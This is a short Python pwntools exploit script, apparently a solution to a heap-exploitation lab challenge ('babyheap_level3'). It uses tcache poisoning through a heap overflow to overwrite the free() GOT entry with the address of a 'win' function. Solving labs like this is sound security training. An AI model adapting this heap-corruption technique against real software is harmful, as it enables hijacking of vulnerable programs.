#!/usr/bin/env python3
from pwn import *
import os

exe = context.binary = ELF(args.EXE or '/challenge/babyheap_level3')
os.chdir('/challenge')
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
break print_menu
continue
'''.format(**locals())

io = start()
CHOICE = b"Choice:"
def malloc(p, size, content):
    p.sendline(b"1")
    p.recvuntil(b"chunk?:")
    p.sendline(b"%d" % (size))
    p.recvuntil(b"Content:")
    p.sendline(b"%b" % (content))
    print(p.recvline()) 
    p.recvuntil(CHOICE)

def free(p, index):
    p.sendline(b"3")
    p.recvuntil(b"Index:")
    p.sendline(b"%d" % (index))
    print(p.recvline()) 
    p.recvuntil(CHOICE)

def edit(p, index, content):
    p.sendline(b"2")
    p.recvuntil(b"Index:")
    p.sendline(b"%d" % (index))
    p.recvuntil(b"content:")
    p.sendline(b"%b" % (content)) 
    print(p.recvline()) 
    p.recvuntil(CHOICE)

def launch_attack(p):
    malloc(p, 8, b'a')
    malloc(p, 8, b'a')
    free(p, 1)
    content = b'a'*(0x20-8) + b'\x21' + b'\x00'*7 + p64(exe.got['free']) 
    free(p, 0)     
    malloc(p, 8, content)
    malloc(p, 8, b'a')
    malloc(p,8, p64(exe.symbols.win ))
    p.interactive()

io.recvuntil(CHOICE)
launch_attack(io)
io.interactive()